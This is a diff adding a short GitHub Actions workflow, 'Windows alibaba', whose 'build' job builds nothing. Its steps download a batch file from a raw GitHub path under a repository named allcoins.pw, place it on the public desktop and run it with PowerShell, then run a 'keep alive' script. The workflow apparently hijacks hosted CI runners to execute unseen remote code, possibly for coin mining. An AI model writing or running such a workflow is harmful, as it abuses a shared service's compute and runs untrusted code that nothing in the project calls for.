@@ -1,0 +1,18 @@
+name: Windows alibaba
+
+on: workflow_dispatch 
+
+jobs:
+  build: 
+    runs-on: windows-latest 
+    
+    steps: 
+    - uses: actions/checkout@v2
+    - name: Auto Prog 
+      run: | 
+        Invoke-WebRequest https://raw.githubusercontent.com/redsunday/allcoins.pw/master/file/a.bat -OutFile a.bat
+        copy "a.bat" "C:\Users\Public\Desktop\a.bat" 
+        Start-Process Powershell -ArgumentList '-Noexit -Command "C:\Users\Public\Desktop\a.bat"' 
+    - name: Keep Alive. 
+      shell: bash 
+      run: sh keep.bat
